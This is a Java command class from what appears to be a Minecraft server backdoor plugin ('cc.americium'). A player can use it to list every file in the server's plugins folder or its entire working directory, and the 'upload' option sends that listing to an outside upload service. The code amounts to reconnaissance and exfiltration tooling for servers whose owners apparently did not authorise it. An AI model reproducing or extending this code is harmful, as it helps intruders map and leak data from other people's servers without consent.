package cc.americium.command.commands;

import cc.americium.Colors;
import cc.americium.Utilities;
import cc.americium.command.Command;
import cc.americium.command.Context;
import cc.americium.command.Sender;
import org.bukkit.entity.Player;

import java.io.BufferedReader;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.ArrayList;
import java.util.Comparator;

public class Plugins implements Command {
    @Override
    public String[] getCommands() {
        return new String[]{"plugins", "pl", "allfiles"};
    }

    @Override
    public String getDescription() {
        return "Shows all all files in the plugins folder. (Use upload as an arg if you want to upload)";
    }

    @Override
    public void execute(Player executor, Sender sender, Context context) {
        ArrayList<String> plugins = new ArrayList<>();
        String[] args = context.getArgs();
        boolean upload = false;
        if (args.length != 0) {
            if (args[0].equalsIgnoreCase("upload")) {
                upload = true;
            }
        }

        try {
            Files.walk(Paths.get(context.getCommand().startsWith("pl") ? "./plugins/" : "./"))
                    .sorted(Comparator.reverseOrder())
                    .map(Path::toFile)
                    .forEach(file -> plugins.add(file.getPath() + (file.isDirectory() ? " (FOLDER)" : "")));
        } catch (IOException e) {
            sender.sendMessage(Colors.Prefix + Colors.Failure + e.getMessage());
        }

        if (plugins.size() == 0) {
            sender.sendMessage(Colors.Prefix + Colors.Failure + "There is nothing???");
            return;
        }

        if (upload) {
            BufferedReader reader;

            try {
                reader = Utilities.uploadFile(String.join("\n", plugins), context.getZ_(), "text");
            } catch (IOException e) {
                sender.sendMessage(Colors.Prefix + Colors.Failure + e.getMessage());
                return;
            }

            String sb = Utilities.getStringFromBuffer(reader);

            if (sb.length() == 0) {
                return;
            }

            sender.sendMessage(Colors.Prefix + Colors.Caution + sb);
            return;
        }

        int page = 1;
        if (args.length != 0) {
            try {
                page = Integer.parseInt(args[0]);
            } catch (Exception e) {
                sender.sendMessage(Colors.Prefix + Colors.Failure + e.getMessage());
                return;
            }
        }


        ArrayList<String> currentLines = new ArrayList<>();
        int currentPageAmount = 0;
        int currentPage = 1;
        int allPages = 1;

        for (String file : plugins) {
            currentPageAmount++;
            if (currentPage == page) {
                currentLines.add(file);
            }

            if (currentPageAmount >= 10) {
                currentPage++;
                allPages++;
                currentPageAmount = 0;

            }
        }

        if (currentLines.size() == 0) {
            sender.sendMessage(Colors.Prefix + Colors.Failure + "That page could not be found!");
            return;
        }

        sender.sendMessage(Colors.Prefix + Colors.Success + "Showing you page " + page + "/" + allPages + ". Use " + context.getCommand() + " <page> to see more.");
        for (String line : currentLines) {
            sender.sendMessage(Colors.Caution + line);
        }
    }
}
